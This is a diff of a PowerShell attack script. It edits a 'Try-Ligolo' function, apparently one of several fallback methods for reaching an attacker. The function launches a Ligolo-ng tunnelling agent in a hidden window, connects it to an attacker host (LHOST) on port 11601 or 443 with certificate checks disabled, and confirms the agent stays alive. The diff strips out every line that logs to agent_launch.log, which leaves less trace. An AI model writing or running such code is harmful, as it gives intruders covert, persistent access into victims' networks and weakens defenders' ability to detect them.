@@ -171,25 +171,21 @@ function Try-ShellBinary {
 # Method 6: Ligolo-ng agent
 # Attempts primary port (11601) then falls back to 443.
 # Skips reachability pre-check - agent handles connection failure itself.
-# Logs to C:\Temp\agent_launch.log for triage.
 function Try-Ligolo {
     $agentPath = "$WORKDIR\agent.exe"
     if (-not (Test-Path $agentPath)) {
-        "$(Get-Date) - agent.exe not found at $agentPath" | Out-File "$WORKDIR\agent_launch.log" -Append
         return
     }
 
     # Check if agent is already running
     $running = Get-Process -Name "agent" -ErrorAction SilentlyContinue
     if ($running) {
-        "$(Get-Date) - agent.exe already running (PID $($running.Id)), skipping" | Out-File "$WORKDIR\agent_launch.log" -Append
         return
     }
 
     $portsToTry = @($LIGOLO_PORT, $LIGOLO_PORT_FALLBACK)
     foreach ($port in $portsToTry) {
         try {
-            "$(Get-Date) - Attempting agent.exe on port $port" | Out-File "$WORKDIR\agent_launch.log" -Append
             $proc = Start-Process -FilePath $agentPath `
                 -ArgumentList "-connect ${LHOST}:${port} -ignore-cert" `
                 -WindowStyle Hidden `
@@ -198,13 +194,9 @@ function Try-Ligolo {
             Start-Sleep -Seconds 3
             # Check if process is still alive after 3 seconds (didn't crash immediately)
             if (-not $proc.HasExited) {
-                "$(Get-Date) - agent.exe launched successfully on port $port (PID $($proc.Id))" | Out-File "$WORKDIR\agent_launch.log" -Append
                 return
-            } else {
-                "$(Get-Date) - agent.exe exited immediately on port $port (exit code $($proc.ExitCode))" | Out-File "$WORKDIR\agent_launch.log" -Append
-            }
+            } 
         } catch {
-            "$(Get-Date) - Exception launching agent.exe on port $port`: $_" | Out-File "$WORKDIR\agent_launch.log" -Append
             continue
         }
     }
